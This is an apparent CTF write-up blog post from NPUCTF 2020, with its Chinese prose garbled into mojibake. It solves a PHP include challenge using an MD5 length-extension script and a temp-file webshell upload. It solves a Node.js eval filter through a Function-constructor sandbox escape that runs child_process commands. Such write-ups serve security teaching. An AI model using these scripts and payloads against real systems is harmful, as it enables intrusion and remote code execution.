<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    NPUCTF_WP |
    
    Mount4in</title>
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<script src="/js/pace.min.js"></script>

<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
</head>

<body>
<main class="content">
  <section class="outer">
  

<article id="post-NPUCTF-WP" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      NPUCTF_WP
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/04/26/NPUCTF-WP/" class="article-date">
  <time datetime="2020-04-26T00:56:34.000Z" itemprop="datePublished">2020-04-26</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        
        <p>è®°å½•å‡ é“NPUCTFæ¯”èµ›WP</p>
<a id="more"></a>

<h1 id="0x01-ezinclude"><a href="#0x01-ezinclude" class="headerlink" title="0x01 ezinclude"></a>0x01 ezinclude</h1><p>é¦–å…ˆè®¿é—®å¯ä»¥å¾—åˆ°</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426095958737.png" alt="image-20200426095958737"></p>
<p>ç„¶åçœ‹åˆ°cookieæœ‰hash</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426101145987.png" alt="image-20200426101145987"></p>
<p>æ„Ÿè§‰è¿™ä¸ªhashå€¼å°±åº”è¯¥æ˜¯$passï¼Œæµ‹è¯•å‘ç°å®ƒå›æ ¹æ®ä¼ å…¥çš„nameå€¼å˜åŒ–ï¼Œç„¶å?name=mount4inï¼Œåhashåˆ·æ–°æˆä¸Šé¢çš„hashå€¼ï¼Œç„¶åå°±å¯ç»•è¿‡ï¼Œ</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426101420611.png" alt="image-20200426101420611"></p>
<p>çœ‹å®˜æ–¹WPè€ƒç‚¹æ˜¯hashæ‰©å±•æ”»å‡»ï¼Œhashæ‰©å±•æ”»å‡»çš„åˆ©ç”¨æ¡ä»¶å°±æ˜¯å¯†é’¥åœ¨å‰é¢ï¼Œå·²çŸ¥ä¸€å¯¹æ˜æ–‡å¯†æ–‡å¯¹ã€‚ç„¶åå¯ä»¥åˆ©ç”¨hashpumpè¿›è¡Œä¼ªé€ å…¶ä»–æ˜æ–‡å¯¹åº”çš„å¯†æ–‡ã€‚è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“å¯†é’¥çš„é•¿åº¦ï¼Œæ‰€ä»¥å»çˆ†ç ´å¯†é’¥é•¿åº¦ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://96a4287d-e8a9-469d-bc19-fe91cd56b249.node3.buuoj.cn/index.php?'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">'5134d395cb21ac79b18b2d7b8d517630'</span>,<span class="string">'admin123'</span>,<span class="string">'1'</span>,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="comment">#print(req.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username/password error'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(i)</span><br><span class="line">        print(req.text,url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¼šè·³è½¬åˆ°flflflflag.phpï¼Œè¿™é‡Œæµè§ˆå™¨ç›´æ¥è®¿é—®ä¼šè·³åˆ°404ç•Œé¢ï¼Œè¿™é‡Œç”¨burpå»è®¿é—®ï¼Œ</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426101637325.png" alt="image-20200426101637325"></p>
<p>æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¼ªåè®®è¯»ä¸‹æºç ï¼Œçœ‹ä¸‹index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">@$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">'pass'</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;script language="javascript" type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">           window.location.href="flflflflag.php";</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setcookie(<span class="string">"Hash"</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"username/password error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$secret=<span class="string">'%^$&amp;$#fffdflag_is_not_here_ha_ha'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>dir.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">'/tmp'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flflflflag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">"javascript"</span> type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">"404.html"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_Ã¥Â‡ÂºÃ©Â¢Â˜Ã¤ÂºÂº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/data|input|zip/is'</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include($_GET["file"])'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸ªdir.phpå¯ä»¥æŸ¥çœ‹/tmpç›®å½•çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯å¯¹ä¸´æ—¶æ–‡ä»¶çš„åˆ©ç”¨äº†ï¼Œä¹‹å‰æœ‰å¤§ä½¬åˆ†æè¿‡åœ¨ä½¿ç”¨php://filter/string.strip_tags/resource=/etc/passwdè¿™ä¸ªè¿‡æ»¤å™¨æ—¶ï¼Œphpä¼šå‘ç”Ÿé”™è¯¯ï¼Œå¯¼è‡´ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ï¼Œä¸€ç›´ä¿å­˜åœ¨/tmpç›®å½•ï¼Œç„¶ååˆ©ç”¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.session()</span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>,<span class="string">"https"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">url= <span class="string">'http://96a4287d-e8a9-469d-bc19-fe91cd56b249.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">	<span class="string">"demo"</span>:(<span class="string">"test.jpg"</span>,<span class="string">"&lt;?php eval($_POST[1]);?&gt;"</span>,<span class="string">"image/jpeg"</span>),</span><br><span class="line">	<span class="string">"submit"</span>:(<span class="literal">None</span>,<span class="string">"submit"</span>)</span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url,proxies=proxy,files=files,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>ä¼ å®Œä¹‹åï¼Œè®¿é—®dir.phpå¯ä»¥å¾—åˆ°ä¸´æ—¶æ–‡ä»¶çš„åï¼Œç„¶ååŒ…å«å°±å¯ä»¥å¾—åˆ°webshellã€‚ç„¶åflagåœ¨phpinfo()é‡Œé¢</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426102656589.png" alt="image-20200426102656589"></p>
<h1 id="0x02-éªŒè¯ğŸ"><a href="#0x02-éªŒè¯ğŸ" class="headerlink" title="0x02 éªŒè¯ğŸ"></a>0x02 éªŒè¯ğŸ</h1><p>å¯ä»¥å¾—åˆ°æºç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">'./key.js'</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">'md5'</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">'./index.html'</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">'&#123;&#123;results&#125;&#125;'</span>, results.join(<span class="string">'&lt;br/&gt;'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">'PHPSESSION'</span>, <span class="comment">// 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å…³é”®ç‚¹åœ¨</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426103241744.png" alt="image-20200426103241744"></p>
<p>ä»è¾“å…¥ä¸­è·å–eã€firstã€secondï¼Œå¦‚æœé€šè¿‡</p>
<p><code>(first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0]))</code>è¿™ä¸ªæ¡ä»¶è€Œä¸”eå­˜åœ¨å°±è°ƒç”¨saferEval()å¤„ç†ã€‚</p>
<p>é¦–å…ˆè¿™ä¸ªæ¡ä»¶è¦æ±‚firstå’Œsecondé•¿åº¦ç›¸ç­‰ã€firstä¸ç­‰äºsecondã€firstå’Œsecondæ‹¼æ¥ä¸€ä¸ªå€¼åçš„md5ç›¸ç­‰ã€‚è¿™ä¸ªä¹‹å‰æœ‰ä¸ªæ¯”èµ›è€ƒè¿‡ï¼Œå…·ä½“é“¾æ¥æ‰¾ä¸åˆ°äº†ï¼Œå› ä¸ºjsä¹Ÿæ˜¯ä¸€ä¸ªå¼±ç±»å‹çš„è¯­è¨€ï¼Œfirstå’Œsecondåœ¨ä¸keys[0]æ‹¼æ¥æ—¶ä¼šå¼ºåˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œè€Œä¸”Stringå’ŒArrayéƒ½æœ‰lengthå±æ€§ã€‚</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426104545707.png" alt="image-20200426104545707" style="zoom:150%;">

<p>ç„¶åå°±æ˜¯å¯¹saferEval()çš„ç»•è¿‡ï¼Œ</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426105112573.png" alt="image-20200426105112573" style="zoom:150%;">

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¿‡æ»¤ä¼šæ›¿æ¢æ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹ä¸ºç©ºï¼Œè‹¥æ›¿æ¢åä¸ºç©ºï¼Œåˆ™æ‰§è¡Œevalï¼›è‹¥ä¸ä¸ºç©ºè¿”å›nullã€‚åˆ†æä¸‹æ­£åˆ™è¡¨è¾¾å¼</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/(?:Math(?:<span class="tag">\<span class="name">.</span></span><span class="tag">\<span class="name">w</span></span>+)?)|[()+<span class="tag">\<span class="name">-</span></span>*/&amp;|^<span class="comment">%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span></span><br><span class="line">(?:Math(?:<span class="tag">\<span class="name">.</span></span><span class="tag">\<span class="name">w</span></span>+)?)</span><br><span class="line">:åŒ¹é…Mathåé¢åŠ å­—æ¯æ•°å­—ä¸‹åˆ’çº¿æˆ–.   å¦‚ï¼šMath.constructoråé¢åªèƒ½0æ¬¡æˆ–1æ¬¡</span><br><span class="line">[()+<span class="tag">\<span class="name">-</span></span>*/&amp;|^<span class="comment">%&lt;&gt;=,?:]</span></span><br><span class="line">:åŒ¹é…()+<span class="tag">\<span class="name">-</span></span>*/&amp;|^<span class="comment">%&lt;&gt;=,?:   è¿™äº›å­—ç¬¦</span></span><br><span class="line">(?:<span class="tag">\<span class="name">d</span></span>+<span class="tag">\<span class="name">.</span></span>?<span class="tag">\<span class="name">d*</span></span>(?:e<span class="tag">\<span class="name">d</span></span>+)?)</span><br><span class="line">:åŒ¹é…æ•°å­—  å¦‚ï¼š122.122</span><br><span class="line">åé¢åº”è¯¥è¿˜æœ‰ä¸€ä¸ªç©ºæ ¼</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥ç”¨åˆ°<code>=&gt;</code>è¿™ä¸ªç¬¦å·ï¼Œæ¥ç”ŸæˆåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸”åœ¨åé¢åŠ ä¸Šå‚æ•°å¯ä»¥ç«‹å³è°ƒç”¨ã€‚</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426113154558.png" alt="image-20200426113154558" style="zoom:150%;">

<p>è¿™é‡Œå…ˆè´´å‡ºpayloadï¼Œç„¶åå†åˆ†æã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.x=<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()))(<span class="built_in">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>æœ€åä¼ ç»™evalæ‰§è¡Œçš„åº”è¯¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼å­—ç¬¦ä¸²ï¼Œå¦‚alert(1)è¿™ç§å½¢å¼ã€‚æ­£åˆ™è¡¨è¾¾å¼åªå…è®¸åœ¨Mathåé¢åŠ å­—æ¯å­—ç¬¦ï¼ŒæŸ¥çœ‹å¯¹åº”çš„Mathçš„å‡½æ•°æ²¡æœ‰èƒ½å¤Ÿå°†æ•°å­—è½¬æ¢æˆå­—æ¯çš„ï¼ˆè¿™é‡Œä¸åƒphpï¼Œphpé‡Œé¢æœ‰å¾ˆå¤šå¯ä»¥å°½å¿ƒè¿›åˆ¶è½¬æ¢çš„å‡½æ•°ï¼‰ï¼Œä½†æ˜¯String.fromCharCode()è¿™ä¸ªå‡½æ•°å¯ä»¥å°†asciiç è½¬æ¢æˆå­—ç¬¦ï¼Œç„¶åå°±é€šè¿‡åŸå‹è·å¾—Stringã€‚</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426120922034.png" alt="image-20200426120922034"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºæˆ‘ä»¬éœ€è¦è·å¾—Functionå’ŒStringï¼Œ</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426121147768.png" alt="image-20200426121147768" style="zoom:150%;">

<p>Math+1ä¼šå› ä¸ºObjectä¸å­—ç¬¦ä¸²æ‹¼æ¥ååŸå‹ä¼šå˜æˆStringï¼Œç„¶åStringçš„constructorä¸ºFunctionï¼Œè¿™æ ·å°±å¾—åˆ°äº†éœ€è¦çš„ä¸œè¥¿ï¼Œè¿›è¡Œæ›¿æ¢å°±å¥½ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Function</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()))()</span><br><span class="line"></span><br><span class="line">(<span class="built_in">Math</span>+<span class="number">1</span>).constructor				======&gt;&gt;<span class="built_in">String</span></span><br><span class="line">(<span class="built_in">Math</span>+<span class="number">1</span>).constructor.constructor	======&gt;&gt;<span class="built_in">Function</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()))(<span class="built_in">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å°†ä¸‹é¢çš„payloadç¼–ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += str(ord(i))</span><br><span class="line">        result += <span class="string">","</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"String.fromCharCode("</span>+fun(<span class="string">"return process.mainModule.require('child_process').execSync('cat /flag')"</span>)+<span class="string">")"</span></span><br><span class="line"><span class="comment">#return process.mainModule.require('child_process').execSync('cat /flag')</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"first"</span>:<span class="string">"1"</span>,<span class="attr">"second"</span>:[<span class="number">1</span>],<span class="attr">"e"</span>:<span class="string">"(Math=&gt;(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)"</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/26/NPUCTF-WP/image-20200426122851092.png" alt="image-20200426122851092"></p>
